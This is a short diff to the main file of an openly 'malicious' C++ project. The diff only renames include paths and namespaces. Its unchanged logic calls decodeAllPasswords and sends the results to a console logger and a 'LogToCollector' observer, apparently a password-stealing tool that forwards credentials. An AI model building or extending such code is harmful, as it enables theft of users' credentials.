@@ -1,14 +1,14 @@
-#include <common/Log.hpp>
+#include <log/Log.hpp>
 #include <malicious/Passwords.hpp>
 using namespace Malicious;
 
-#include <Innocence.hpp>
+#include <common/Innocence.hpp>
 
 int main()
 {
-	LOG.setIdentity(Innocence::identity);
-	LOG.addObserver(new Common::LogToConsole);
-	LOG.addObserver(new Common::LogToCollector);
+	LOG.setIdentity(Common::identity);
+	LOG.addObserver(new Log::LogToConsole);
+	LOG.addObserver(new Log::LogToCollector);
 
 	LOG << decodeAllPasswords(',');
 	return EXIT_SUCCESS;
